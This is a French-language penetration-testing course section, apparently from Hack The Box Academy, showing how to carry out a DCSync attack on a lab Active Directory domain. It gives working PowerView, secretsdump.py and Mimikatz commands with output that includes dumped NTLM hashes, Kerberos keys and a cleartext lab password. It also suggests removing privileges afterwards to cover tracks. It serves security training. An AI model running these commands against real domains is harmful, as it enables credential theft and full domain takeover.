DCSync
======

* * * * *

Sur la base de notre travail dans la section précédente, nous avons maintenant le contrôle sur l'utilisateur `adunn`qui dispose des privilèges DCSync dans le domaine INLANEFREIGHT.LOCAL. Approfondissons cette attaque et passons en revue des exemples d'utilisation de celle-ci pour compromettre l'intégralité du domaine à partir d'un hôte d'attaque Linux et Windows.

* * * * *

Configuration du scénario
-------------------------

Dans cette section, nous ferons des allers-retours entre un hôte d'attaque Windows et Linux au fur et à mesure que nous travaillerons sur les différents exemples. Vous pouvez générer les hôtes pour cette section à la fin de cette section et RDP dans l'hôte d'attaque Windows MS01. Pour la partie de cette section qui nécessite une interaction d'un hôte Linux (secretsdump.py), vous pouvez ouvrir une console PowerShell sur MS01 et SSH `172.16.5.225`avec les informations d'identification `htb-student:HTB_@cademy_stdnt!`. Cela pourrait également être fait à partir de Windows en utilisant une version `secretsdump.exe`compilée pour Windows, car il existe plusieurs référentiels GitHub de la boîte à outils Impacket compilée pour Windows, ou vous pouvez le faire en tant que défi secondaire.

* * * * *

Qu'est-ce que DCSync et comment ça marche ?
-------------------------------------------

DCSync est une technique permettant de voler la base de données de mots de passe Active Directory à l'aide de la fonction intégrée `Directory Replication Service Remote Protocol`, qui est utilisée par les contrôleurs de domaine pour répliquer les données de domaine. Cela permet à un attaquant d'imiter un contrôleur de domaine pour récupérer les hachages de mot de passe NTLM de l'utilisateur.

Le cœur de l'attaque demande à un contrôleur de domaine de répliquer les mots de passe via le `DS-Replication-Get-Changes-All`droit étendu. Il s'agit d'un droit de contrôle d'accès étendu au sein d'AD, qui permet la réplication de données secrètes.

Pour effectuer cette attaque, vous devez avoir le contrôle sur un compte qui a les droits pour effectuer la réplication de domaine (un utilisateur avec les autorisations Réplication des modifications de répertoire et Réplication de toutes les modifications de répertoire définies). Les administrateurs de domaine/d'entreprise et les administrateurs de domaine par défaut ont ce droit par défaut.

#### Affichage des privilèges de réplication d'adunn via ADSI Edit

![image](https://academy.hackthebox.com/storage/modules/143/adnunn_right_dcsync.png)

Lors d'une évaluation, il est courant de trouver d'autres comptes disposant de ces droits, et une fois compromis, leur accès peut être utilisé pour récupérer le hachage de mot de passe NTLM actuel pour tout utilisateur de domaine et les hachages correspondant à leurs mots de passe précédents. Ici, nous avons un utilisateur de domaine standard qui a reçu les autorisations de réplication :

#### Utilisation de Get-DomainUser pour afficher l'appartenance au groupe d'adunn

  Utilisation de Get-DomainUser pour afficher l'appartenance au groupe d'adunn

```
PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

```

PowerView peut être utilisé pour confirmer que cet utilisateur standard dispose bien des autorisations nécessaires attribuées à son compte. Nous obtenons d'abord le SID de l'utilisateur dans la commande ci-dessus, puis vérifions toutes les ACL définies sur l'objet de domaine ( `"DC=inlanefreight,DC=local"`) à l'aide de [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) pour obtenir les ACL associées à l'objet. Ici, nous recherchons spécifiquement les droits de réplication et vérifions si notre utilisateur `adunn`(désigné dans la commande ci-dessous par `$sid`) possède ces droits. La commande confirme que l'utilisateur a bien les droits.

#### Utilisation de Get-ObjectAcl pour vérifier les droits de réplication d'adunn

  Utilisation de Get-ObjectAcl pour vérifier les droits de réplication d'adunn

```
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All

```

Si nous avions certains droits sur l'utilisateur (tels que [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl) ), nous pourrions également ajouter ce privilège à un utilisateur sous notre contrôle, exécuter l'attaque DCSync, puis supprimer les privilèges pour tenter de couvrir nos traces. La réplication DCSync peut être effectuée à l'aide d'outils tels que Mimikatz, Invoke-DCSync et secretsdump.py d'Impacket. Voyons quelques exemples rapides.

L'exécution de l'outil comme ci-dessous écrira tous les hachages dans les fichiers avec le préfixe `inlanefreight_hashes`. L' `-just-dc`indicateur indique à l'outil d'extraire les hachages NTLM et les clés Kerberos du fichier NTDS.

#### Extraction des hachages NTLM et des clés Kerberos à l'aide de secretsdump.py

  Extraction des hachages NTLM et des clés Kerberos à l'aide de secretsdump.py

```
dsgsec@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

<SNIP>

d0wngrade:des-cbc-md5:d6fee0b62aa410fe
d0wngrade:dec-cbc-crc:d6fee0b62aa410fe
ACADEMY-EA-FILE$:des-cbc-md5:eaef54a2c101406d
svc_qualys:des-cbc-md5:f125ab34b53eb61c
forend:des-cbc-md5:e3c14adf9d8a04c1
[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
[*] Cleaning up...

```

Nous pouvons utiliser l' `-just-dc-ntlm`indicateur si nous ne voulons que des hachages NTLM ou spécifier `-just-dc-user <USERNAME>`d'extraire uniquement les données d'un utilisateur spécifique. D'autres options utiles incluent `-pwd-last-set`pour voir quand le mot de passe de chaque compte a été modifié pour la dernière fois et `-history`si nous voulons vider l'historique des mots de passe, ce qui peut être utile pour le craquage de mot de passe hors ligne ou comme données supplémentaires sur les métriques de force de mot de passe de domaine pour notre client. Il `-user-status`s'agit d'un autre indicateur utile pour vérifier et voir si un utilisateur est désactivé. Nous pouvons vider les données NTDS avec cet indicateur, puis filtrer les utilisateurs désactivés lorsque nous fournissons à notre client des statistiques de craquage de mot de passe pour nous assurer que des données telles que :

-   Nombre et % de mots de passe piratés
-   10 meilleurs mots de passe
-   Métriques de longueur de mot de passe
-   Réutilisation du mot de passe

reflètent uniquement les comptes d'utilisateurs actifs dans le domaine.

Si nous vérifions les fichiers créés à l'aide de l' `-just-dc`indicateur, nous verrons qu'il y en a trois : un contenant les hachages NTLM, un contenant les clés Kerberos et un qui contiendrait les mots de passe en clair du NTDS pour tous les comptes définis avec le cryptage réversible [activé](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) .

#### Liste des hachages, des clés Kerberos et des mots de passe en clair

  Liste des hachages, des clés Kerberos et des mots de passe en clair

```
dsgsec@htb[/htb]$ ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos

```

Bien que rares, nous voyons de temps en temps des comptes avec ces paramètres. Il serait généralement configuré pour prendre en charge les applications qui utilisent certains protocoles nécessitant l'utilisation du mot de passe d'un utilisateur à des fins d'authentification.

#### Affichage d'un compte avec un ensemble de stockage de mot de passe à chiffrement réversible

![image](https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png)

Lorsque cette option est définie sur un compte utilisateur, cela ne signifie pas que les mots de passe sont stockés en texte clair. Au lieu de cela, ils sont stockés à l'aide du cryptage RC4. L'astuce ici est que la clé nécessaire pour les déchiffrer est stockée dans le registre (la [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview) ) et peut être extraite par un administrateur de domaine ou équivalent. Des outils tels que `secretsdump.py`décrypteront tous les mots de passe stockés à l'aide d'un cryptage réversible lors du vidage du fichier NTDS soit en tant qu'administrateur de domaine, soit en utilisant une attaque telle que DCSync. Si ce paramètre est désactivé sur un compte, un utilisateur devra modifier son mot de passe pour qu'il soit stocké à l'aide d'un cryptage à sens unique. Tous les mots de passe définis sur les comptes avec ce paramètre activé seront stockés à l'aide d'un cryptage réversible jusqu'à ce qu'ils soient modifiés. Nous pouvons énumérer cela à l'aide de l' `Get-ADUser`applet de commande :

#### Enumérer davantage à l'aide de Get-ADUser

  Enumérer davantage à l'aide de Get-ADUser

```
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :

```

Nous pouvons voir qu'un compte, `proxyagent`, a également l'option de cryptage réversible définie avec PowerView :

#### Vérification de l'option de chiffrement réversible à l'aide de Get-DomainUser

  Vérification de l'option de chiffrement réversible à l'aide de Get-DomainUser

```
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
syncron        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT

```

Nous remarquerons que l'outil a déchiffré le mot de passe et nous a fourni la valeur en clair.

#### Affichage du mot de passe décrypté

  Affichage du mot de passe décrypté

```
dsgsec@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext

proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!

```

J'ai participé à quelques engagements où tous les comptes d'utilisateurs étaient stockés à l'aide d'un cryptage réversible. Certains clients peuvent le faire pour pouvoir vider NTDS et effectuer des audits périodiques de la force du mot de passe sans avoir à recourir au craquage de mot de passe hors ligne.

Nous pouvons également effectuer l'attaque avec Mimikatz. En utilisant Mimikatz, nous devons cibler un utilisateur spécifique. Ici, nous ciblerons le compte administrateur intégré. Nous pourrions également cibler le `krbtgt`compte et l'utiliser pour créer un `Golden Ticket`pour la persistance, mais cela sort du cadre de ce module.

#### Effectuer l'attaque avec Mimikatz

  Effectuer l'attaque avec Mimikatz

```
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4625fd0c31368ff4c255a3b876eaac3d

<SNIP>

```

* * * * *

Passer à autre chose
--------------------

Dans la section suivante, nous verrons quelques façons d'énumérer et de profiter des droits d'accès à distance qui peuvent être accordés à un utilisateur que nous contrôlons. Ces méthodes incluent le protocole RDP (Remote Desktop Protocol), WinRM (ou PsRemoting) et l'accès administrateur SQL Server.
